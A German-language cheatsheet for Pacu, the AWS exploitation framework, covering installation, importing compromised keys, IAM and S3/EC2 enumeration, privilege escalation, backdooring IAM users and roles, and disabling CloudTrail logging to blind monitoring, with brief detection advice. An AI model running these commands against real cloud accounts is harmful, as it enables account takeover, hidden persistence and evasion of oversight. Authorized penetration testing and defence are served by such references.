<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ☁️ Pacu – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗  █████╗  ██████╗██╗   ██╗
  ██╔══██╗██╔══██╗██╔════╝██║   ██║
  ██████╔╝███████║██║     ██║   ██║
  ██╔═══╝ ██╔══██║██║     ██║   ██║
  ██║     ██║  ██║╚██████╗╚██████╔╝
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
       The AWS Exploitation Framework by Rhino Security Labs
```
<p align="center">
  <img src="https://img.shields.io/badge/Pacu-AWS_Exploitation-blue?style=for-the-badge" alt="Pacu">
  <img src="https://img.shields.io/badge/Author-Rhino_Security_Labs-orange?style=for-the-badge" alt="Rhino Security Labs">
  <img src="https://img.shields.io/badge/Platform-Amazon_Web_Services-gold?style=for-the-badge" alt="AWS">
  <img src="https://img.shields.io/badge/Category-Cloud_Security-green?style=for-the-badge" alt="Cloud-Sicherheit">
</p>

<p align="center">
  <b>☁️ Das Open-Source-AWS-Nutzungsframework, das für Penetrationstests in Cloud-Umgebungen, Privilegienausweitung, Zugangsdatenerfassung und Infrastrukturaufklärung entwickelt wurde</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Übersicht & Architektur](#-overview--architecture)
- [Installation](#-Installation)
- [Sitzungsverwaltung und AWS-Schlüsselimport](#-session-management--aws-key-import)
  - [Kompromittierte Zugangsdaten importieren](#importing-compromised-credentials)
  - [Angenommene Rollen und Sitzungstoken](#assumed-roles-and-session-tokens)
- [Aufklärungs- und Aufzählungsmodule](#-reconnaissance--enumeration-modules)
  - [Aufzählung aktueller IAM-Berechtigungen](#enumerating-current-iam-permissions)
  - [Scannen von EC2-Instanzen und S3-Buckets](#scanning-ec2-instances--s3-buckets)
- [Techniken zur Privilegieneskalation in AWS](#-privilege-escalation-techniques-in-aws)
  - [Automatischer Privilege-Escalation-Scanner](#automatic-privilege-escalation-scanner)
  - [Eskalationsmodule ausführen](#executing-escalation-modules)
- [Beharrlichkeit und Verteidigungsumgehung](#-persistence--defense-evasion)
  - [Backdooring von IAM-Rollen und -Benutzern](#backdooring-iam-roles--users)
  - [Unterbrechung der CloudTrail-Protokollierung](#disrupting-cloudtrail-logging)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Verteidigungsüberlegungen und Erkennung](#-defensive-überlegungen--erkennung)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)

---

## 🎯 Übersicht & Architektur

**Pacu** wurde von **Rhino Security Labs** entwickelt und ist der „Metasploit für AWS“. Es wurde entwickelt, um gegnerische Taktiken in Amazon Web Services-Umgebungen zu emulieren.

Pacu arbeitet mit einer lokalen SQLite-Datenbank, die den Status über anstößige Sitzungen hinweg aufrechterhält:
- **Modulare Pipeline:** Über 40 spezialisierte Module für Entdeckung, laterale Bewegung, Rechteausweitung, Persistenz und Exfiltration.
- **Berechtigungsaufzählung:** Analysiert IAM-Richtlinien, ohne Warnschwellenwerte auszulösen, indem API-Aktionen getestet oder angehängte verwaltete Richtlinien überprüft werden.
- **Privesc-Automatisierung:** Wertet bekannte Eskalationspfade für IAM-Berechtigungen aus (z. B. `iam:CreateAccessKey`, `iam:PassRole`, `iam:AttachUserPolicy`).

---

## 📥 Installation
```bash
# Clone the repository
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu

# Install dependencies in virtual environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Launch Pacu console
python3 pacu.py
```
---

## 🔑 Sitzungsverwaltung und AWS-Schlüsselimport

Wenn Pacu startet, betreten Sie eine interaktive Konsole. Erstellen Sie eine Sitzung oder wählen Sie sie aus:
```text
Pacu > set_session client_assessment
```
### Kompromittierte Anmeldeinformationen importieren
```text
Pacu (client_assessment) > set_keys
Enter Key Alias: compromised_dev
Enter AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
Enter AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Enter AWS Session Token (Optional): 
Enter Default Region: us-east-1
```
### Angenommene Rollen und Sitzungstoken
```text
# Switch active keys within the session
Pacu (client_assessment) > swap_keys
```
---

## 🔍 Aufklärungs- und Zählmodule

### Aufzählung der aktuellen IAM-Berechtigungen
Bestimmen Sie, wer Sie sind und was die aktiven Anmeldeinformationen tun dürfen:
```text
# Query caller identity and enumerate attached user/group/role policies
Pacu (client_assessment) > run iam__enum_permissions
Pacu (client_assessment) > whoami
```
### Scannen von EC2-Instanzen und S3-Buckets
```text
# Enumerate all EC2 instances and security groups
Pacu (client_assessment) > run ec2__enum

# Enumerate accessible S3 buckets and identify public read/write permissions
Pacu (client_assessment) > run s3__enum
```
---

## ⚡ Techniken zur Privilegieneskalation in AWS

Die Eskalation von AWS-Berechtigungen basiert auf falsch konfigurierten IAM-Richtlinien, die es nicht-administrativen Benutzern ermöglichen, sich selbst oder anderen Entitäten Administratorrechte zu gewähren.

### Automatischer Privilege-Escalation-Scanner
Scannt Ihre aufgezählten Berechtigungen anhand von mehr als 21 dokumentierten AWS-Privesc-Vektoren:
```text
Pacu (client_assessment) > run iam__privesc_scan
```
*Beispielausgabe hebt anfällige Berechtigungen wie `iam:PutUserPolicy`, `iam:AttachUserPolicy` oder `iam:CreateAccessKey` hervor.*

### Eskalationsmodule ausführen
```text
# Exploit iam:AttachUserPolicy to attach AdministratorAccess
Pacu (client_assessment) > run iam__privesc_scan --exec

# Exploit iam:CreateAccessKey to create keys for another high-priv user
Pacu (client_assessment) > run iam__backdoor_users_keys --username target_admin
```
---

## 🛡️ Beharrlichkeit und Abwehrflucht

### Backdooring von IAM-Rollen und -Benutzern
```text
# Add a new access key to an existing user for persistent access
Pacu (client_assessment) > run iam__backdoor_users_keys --username backup_service

# Modify assume-role trust policy to allow external account access
Pacu (client_assessment) > run iam__backdoor_assume_role --role-name ProductionSupport --external-account-id 123456789012
```
### Störung der CloudTrail-Protokollierung
```text
# Identify CloudTrail trails
Pacu (client_assessment) > run cloudtrail__enum

# Stop logging on active trails to blind SOC monitors
Pacu (client_assessment) > run cloudtrail__disrupt_logging --trail-name CorpSecurityTrail
```
---

## ⚡ Kurzreferenztabelle

| Ziel | Pacu-Befehl |
|-----------|--------------|
| **Sitzung festlegen/auswählen** | `set_session <NAME>` |
| **AWS-Anmeldeinformationen importieren** | `set_keys` |
| **Aktuelle Identität anzeigen** | `whoami` |
| **IAM-Rechte aufzählen** | `run iam__enum_permissions` |
| **Nach Privesc-Vektoren suchen** | `run iam__privesc_scan` |
| **S3-Buckets aufzählen** | `run s3__enum` |
| **EC2-Instanzen aufzählen** | `run ec2__enum` |
| **CloudTrail unterbrechen** | `run cloudtrail__disrupt_logging` |
| **Verfügbare Module auflisten** | `list` |

---

## 🛡️ Defensive Überlegungen und Erkennung

1. **GuardDuty- und CloudTrail-Überwachung:** Pacus automatisierte Rechteausweitung und Berechtigungsprüfung generieren schnelle sequentielle API-Abfragen, die von AWS GuardDuty einfach gekennzeichnet werden können.
2. **SCP- und Berechtigungsgrenzen:** Erzwingen Sie die Service Control Policies (SCPs) von AWS Organizations, um zu verhindern, dass Prinzipale – einschließlich Volladministratoren – CloudTrail manipulieren oder Stammorganisationsstrukturen ändern.

---

## ⚠️ Rechtlicher Haftungsausschluss

> [!ACHTUNG]
> Pacu wurde speziell für autorisierte AWS-Penetrationstests und Sicherheitsbewertungen entwickelt. Das Testen von Cloud-Konten ohne ausdrückliche vorherige Genehmigung des Asset-Eigentümers verstößt gegen die Richtlinien zur akzeptablen Nutzung von Amazon Web Services und gegen internationales Recht.